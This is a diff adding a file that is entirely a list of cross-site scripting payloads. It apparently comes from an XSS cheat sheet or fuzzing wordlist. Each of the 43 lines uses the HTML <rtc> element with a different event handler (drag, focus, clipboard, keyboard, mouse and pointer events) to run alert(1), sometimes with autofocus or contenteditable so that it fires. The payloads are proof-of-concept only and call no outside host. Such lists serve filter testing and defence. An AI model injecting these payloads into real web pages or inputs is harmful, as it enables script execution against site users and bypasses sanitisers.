@@ -1,0 +1,43 @@
+<rtc draggable="true" ondrag="alert(1)">test</rtc>
+<rtc draggable="true" ondragend="alert(1)">test</rtc>
+<rtc draggable="true" ondragenter="alert(1)">test</rtc>
+<rtc draggable="true" ondragleave="alert(1)">test</rtc>
+<rtc draggable="true" ondragstart="alert(1)">test</rtc>
+<rtc id=x tabindex=1 onactivate=alert(1)></rtc>
+<rtc id=x tabindex=1 onbeforeactivate=alert(1)></rtc>
+<rtc id=x tabindex=1 onbeforedeactivate=alert(1)></rtc><input autofocus>
+<rtc id=x tabindex=1 ondeactivate=alert(1)></rtc><input id=y autofocus>
+<rtc id=x tabindex=1 onfocus=alert(1)></rtc>
+<rtc id=x tabindex=1 onfocusin=alert(1)></rtc>
+<rtc onafterscriptexecute=alert(1)><script>1</script>
+<rtc onbeforecopy="alert(1)" contenteditable>test</rtc>
+<rtc onbeforecut="alert(1)" contenteditable>test</rtc>
+<rtc onbeforepaste="alert(1)" contenteditable>test</rtc>
+<rtc onbeforescriptexecute=alert(1)><script>1</script>
+<rtc onblur=alert(1) tabindex=1 id=x></rtc><input autofocus>
+<rtc onclick="alert(1)">test</rtc>
+<rtc oncontextmenu="alert(1)">test</rtc>
+<rtc oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<rtc oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<rtc ondblclick="alert(1)" autofocus tabindex=1>test</rtc>
+<rtc onfocusout=alert(1) tabindex=1 id=x></rtc><input autofocus>
+<rtc onkeydown="alert(1)" contenteditable>test</rtc>
+<rtc onkeypress="alert(1)" contenteditable>test</rtc>
+<rtc onkeyup="alert(1)" contenteditable>test</rtc>
+<rtc onmousedown="alert(1)">test</rtc>
+<rtc onmouseenter="alert(1)">test</rtc>
+<rtc onmouseleave="alert(1)">test</rtc>
+<rtc onmousemove="alert(1)">test</rtc>
+<rtc onmouseout="alert(1)">test</rtc>
+<rtc onmouseover="alert(1)">test</rtc>
+<rtc onmouseup="alert(1)">test</rtc>
+<rtc onmousewheel=alert(1)>requires scrolling
+<rtc onpaste="alert(1)" contenteditable>test</rtc>
+<rtc onpointerdown=alert(1)>XSS</rtc>
+<rtc onpointerenter=alert(1)>XSS</rtc>
+<rtc onpointerleave=alert(1)>XSS</rtc>
+<rtc onpointermove=alert(1)>XSS</rtc>
+<rtc onpointerout=alert(1)>XSS</rtc>
+<rtc onpointerover=alert(1)>XSS</rtc>
+<rtc onpointerrawupdate=alert(1)>XSS</rtc>
+<rtc onpointerup=alert(1)>XSS</rtc>
